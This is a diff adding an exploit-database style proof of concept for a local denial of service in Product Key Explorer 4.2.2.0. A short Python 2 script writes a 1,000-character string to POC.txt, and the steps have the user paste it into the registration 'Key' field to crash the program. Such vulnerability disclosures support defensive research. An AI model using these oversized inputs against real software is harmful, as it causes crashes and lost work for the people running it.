@@ -1,0 +1,35 @@
+# Exploit Title: Product Key Explorer 4.2.2.0 - 'Key' Denial of Service (PoC)
+# Discovery by: 0xMoHassan
+# Date: 2020-04-04
+# Vendor Homepage: http://www.nsauditor.com
+# Software Link: http://www.nsauditor.com/downloads/productkeyexplorer_setup.exe
+# Tested Version: 4.2.2.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows XP - SP3
+
+# About App
+
+# Product Key Explorer is a powerful product key finder solution for Windows, designed to help users find, # recover and backup activation keys for +9000 popular software programs installed on local or network computers.
+
+
+# PoC
+# 1.Run the python script, it will create a new file "POC.txt"
+# 3.Run Product Key Explorer and click on "Register -> Enter Registration Code"
+# 2.Paste the content of POC.txt into the Field: 'Key'
+# 6.click 'ok'
+# 5.Magic happen :)
+
+
+
+#!/usr/bin/env python
+buff = "\x41" *500
+buff += "\x41" * 500
+
+try:
+    f=open("POC.txt","w")
+    print "[+] Creating %s bytes payload.." %len(buff)
+    f.write(buff)
+    f.close()
+    print "[+] POC created!"
+except:
+    print "POC cannot be created"
